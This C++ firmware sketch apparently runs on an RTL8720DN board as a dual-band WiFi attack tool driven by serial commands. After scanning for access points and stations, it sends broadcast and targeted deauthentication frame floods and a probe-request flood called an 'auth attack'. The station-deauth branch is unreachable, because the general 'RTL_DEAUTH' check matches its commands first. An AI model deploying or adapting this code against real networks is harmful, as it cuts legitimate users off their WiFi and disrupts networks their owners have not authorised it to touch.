#include "src/wifi_frame_tx.h"
#include "src/communication.h"
#include "src/utils.h"
#include "src/wififunc.h"

// RTL8720DN

std::vector<BssidToDeauth> bssid_to_deauth_list;

void setup() {
    Serial.begin(115200);
    delay(100);
    pinMode(LED_R, OUTPUT);
    pinMode(LED_G, OUTPUT);
    pinMode(LED_B, OUTPUT);
}

bool ap_scan = false;
bool ap_sta_scan = false;
bool broadcast_deauth_attack = false;
bool sta_deauth_attack = false;
bool auth_attack = false;

uint8_t bssid_to_deauth[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint8_t sta_to_deauth[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
String ssid_to_probe_req = "";
uint8_t channel = 1;

void loop() {
    String command = readMasterResponse();

    if (command.length() > 0) {
        if (command == "RTL_READY") Serial.println("RTL_READY");
        else if (command == "RTL_STOP_SCAN") {
            bssid_to_deauth_list.clear();
            //channels.clear();
            ap_scan = false;
            ap_sta_scan = false;

            broadcast_deauth_attack = false;
            sta_deauth_attack = false;
            auth_attack = false;

            digitalWrite(LED_R, LOW);
            digitalWrite(LED_G, LOW);
            digitalWrite(LED_B, LOW);

            wifi_off();
            wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
        }
        else if (command == "RTL_START_AP_SCAN") {
            digitalWrite(LED_G, HIGH);
            ap_scan = true;
            band5ghz_scan = false;
            channel = 1;

            wifi_on(RTW_MODE_STA);
            delay(500);
            int timeout = 0;
            while (wifi_is_ready_to_transceive(RTW_STA_INTERFACE) != RTW_SUCCESS && timeout < 50) {
                delay(100);
                timeout++;
            }
            wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl_ap_sniffer_callback, 1);
        }
        else if (command == "RTL_START_AP_STA_SCAN") {
            digitalWrite(LED_B, HIGH);
            ap_sta_scan = true;
            band5ghz_scan = false;
            channel = 1;

            wifi_on(RTW_MODE_STA);
            int timeout = 0;
            while (wifi_is_ready_to_transceive(RTW_STA_INTERFACE) != RTW_SUCCESS && timeout < 25) {
                delay(100);
                timeout++;
            }
            wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl_ap_sta_sniffer_callback, 1);
        }
        else if (command.startsWith("RTL_DEAUTH")) {
            // RTL_DEAUTH -am {<MAC_ADDRESS>} -c {<CHANNEL>}
            int am_arg_index = command.indexOf("-am ");
            int c_arg_index = command.indexOf("-c ");

            if (am_arg_index > 0 && c_arg_index > 0) {
                // Parse src_macs
                int src_start = command.indexOf("{", am_arg_index) + 1;
                int src_end = command.indexOf("}", am_arg_index);
                String src_macs_str = command.substring(src_start, src_end);
                
                // Parse channels
                int ch_start = command.indexOf("{", c_arg_index) + 1;
                int ch_end = command.indexOf("}", c_arg_index);
                String channels_str = command.substring(ch_start, ch_end);

                std::vector<String> src_macs;
                std::vector<String> channels;
                
                // Split and process
                int src_count = splitStringToVector(src_macs_str, ',', src_macs);
                int ch_count = splitStringToVector(channels_str, ',', channels);
                
                for (int i = 0; i < src_count && i < ch_count; i++) {
                    uint8_t src_mac[6];
                    stringToMac(src_macs[i], src_mac);
                    int channel = channels[i].toInt();

                    BssidToDeauth btd;
                    memcpy(btd.bssid, src_mac, 6);
                    btd.channel = channel;
                    bssid_to_deauth_list.push_back(btd);
                }
                
                digitalWrite(LED_R, HIGH);
                wifi_on(RTW_MODE_STA);
                broadcast_deauth_attack = true;
            }
        }
        else if (command.startsWith("RTL_DEAUTH_STA")) {
            // RTL_DEAUTH_STA -sm <STA_MAC_ADDRESS> -am <AP_MAC_ADDRESS> -c <CHANNEL>
            int sm_arg_index = command.indexOf("-sm ");
            int am_arg_index = command.indexOf("-am ");
            int c_arg_index = command.indexOf("-c ");

            if (sm_arg_index > 0 && am_arg_index > 0 && c_arg_index > 0) {
                String sta_mac_str = command.substring(sm_arg_index + 4, am_arg_index - 1);
                String ap_mac_str = command.substring(am_arg_index + 4, c_arg_index - 1);
                String channel_str = command.substring(c_arg_index + 3);

                stringToMac(sta_mac_str, sta_to_deauth);
                stringToMac(ap_mac_str, bssid_to_deauth);
                channel = channel_str.toInt();

                digitalWrite(LED_R, HIGH);
                wifi_on(RTW_MODE_STA);
                sta_deauth_attack = true;
            }
        }
        else if (command.startsWith("RTL_START_AUTH_ATTACK")) {
            // RTL_START_AUTH_ATTACK -s <SSID> -c <CHANNEL>
            int s_arg_index = command.indexOf("-s ");
            int c_arg_index = command.indexOf("-c ");

            if (s_arg_index > 0 && c_arg_index > 0) {
                ssid_to_probe_req = command.substring(s_arg_index + 3, c_arg_index - 1);
                String channel_str = command.substring(c_arg_index + 3);

                channel = channel_str.toInt();

                digitalWrite(LED_R, HIGH);
                auth_attack = true;
            }
        }
    }

    if (ap_scan || ap_sta_scan) {
        channelHop();
    }
    else if (broadcast_deauth_attack) {
        for (int i = 0; i < bssid_to_deauth_list.size(); i++) {
            sendDualBandDeauthFrame(bssid_to_deauth_list[i].bssid, bssid_to_deauth_list[i].channel);
            delay(1);
        }
    }
    else if (sta_deauth_attack) {
        sendDualBandDeauthFrame(bssid_to_deauth, channel, sta_to_deauth);
        delay(1);
    }
    else if (auth_attack) {
        sendDualBandProbeReqFrame(ssid_to_probe_req, channel);
        delay(1);
    }
}